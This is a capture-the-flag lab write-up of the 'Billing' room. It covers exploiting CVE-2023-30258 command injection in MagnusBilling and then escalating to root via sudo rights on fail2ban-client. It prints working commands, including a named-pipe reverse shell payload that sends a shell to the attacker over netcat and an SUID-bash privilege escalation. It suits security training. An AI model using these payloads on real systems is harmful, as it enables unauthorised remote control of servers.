
# 💸 Billing — Command Injection to Root

> **Challenge Description:**  
> Gain a shell, find the way, and escalate your privileges!

---

## 🧠 Overview

In the Billing room, we exploited a command injection vulnerability in the MagnusBilling web application to gain an initial foothold. With sudo privileges over the Fail2Ban service, we leveraged a misconfiguration to escalate privileges and gain a root shell.

---

## 🔍 Enumeration

### 🔎 Port Scanning

```bash
nmap -p- -sC -sV [target IP]
```

- Full TCP port scan with default scripts (`-sC`) and version detection (`-sV`).
- Identify exposed services and applications.

---

## 🌐 Web Enumeration

- Explored web paths and checked common directories.
- Identified **MagnusBilling** application.
- Discovered **CVE-2023-30258** – an unauthenticated **command injection** vulnerability.

### ✅ Proof of Vulnerability

```bash
curl -s 'http://[target]/mbilling/lib/icepay.php?democ=;sleep+2;'
```

---

## 🐚 Getting a Shell

### 🌀 Payload (Named Pipe Reverse Shell)

```bash
curl -s 'http://[target]/mbilling/lib/icepay/icepay.php' \
--get --data-urlencode \
'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [your-ip] 443 >/tmp/f;'
```

**Start your listener:**
```bash
nc -lvnp 443
```

---

### 🧽 Shell Upgrade

Once connected:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

**Suspend and fix terminal locally:**

```bash
Ctrl + Z
stty raw -echo; fg
```

✅ You now have an interactive shell.

---

## 🧑‍💻 Privilege Escalation

### 🔐 Using `fail2ban-client`

The user had `sudo` rights to manage **Fail2Ban**:

```bash
sudo fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
```

- This command sets a custom ban action that applies the **SUID bit** to `/bin/bash`.

Then, execute:

```bash
bash -p
```

✅ Root shell achieved!

---

## 📂 Flags

- `user.txt`: Found in the user home directory.
- `root.txt`: Accessible after privilege escalation.

---

## 📌 Summary

| Step | Description |
|------|-------------|
| Recon | Scanned for open ports and found MagnusBilling |
| Foothold | Used CVE-2023-30258 to exploit a command injection |
| Shell | Sent a reverse shell payload via HTTP |
| PrivEsc | Abused `fail2ban-client` sudo rights to gain root |
| Post Exploitation | Upgraded shell and accessed flags |

---

## 🧪 Extra Notes

### 🔍 CVE-2023-30258

- Affects MagnusBilling's `icepay.php`.
- Allows unauthenticated RCE via the `democ` parameter.

---

### 🧰 Useful Tools

- `nmap`, `dirsearch`, `curl`, `netcat`
- Python for TTY upgrades
- `fail2ban-client` for root escalation
